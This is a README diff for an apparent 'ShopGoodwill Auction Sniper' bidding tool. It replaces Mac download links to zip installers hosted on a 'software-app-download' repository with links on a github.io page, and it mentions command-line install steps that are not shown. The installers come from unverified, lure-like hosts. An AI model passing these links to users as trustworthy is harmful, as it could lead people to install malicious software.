@@ -4,9 +4,9 @@
 
 ## Download
 
-[![ShopGoodwill Auction Sniper Windows](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-windows.png?raw=true)](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.zip)  |  [![ShopGoodwill Auction Sniper Mac](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-mac.png?raw=true)](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
+[![ShopGoodwill Auction Sniper Windows](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-windows.png?raw=true)](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.zip)  |  [![ShopGoodwill Auction Sniper Mac](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/auctionsniper-mac.png?raw=true)](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Mac_Installer.zip)
 :-------------------------:|:-------------------------:
-[Windows](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.zip)  |  [Mac](https://github.com/software-app-download/windows-mac/raw/main/shopgoodwill-auction-sniper-mac.zip?download=)
+[Windows](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Windows_Installer.zip)  |  [Mac](https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Mac_Installer.zip)
 
 ### Download Above or Install Directly from Command Prompt/PowerShell/Terminal Below
 
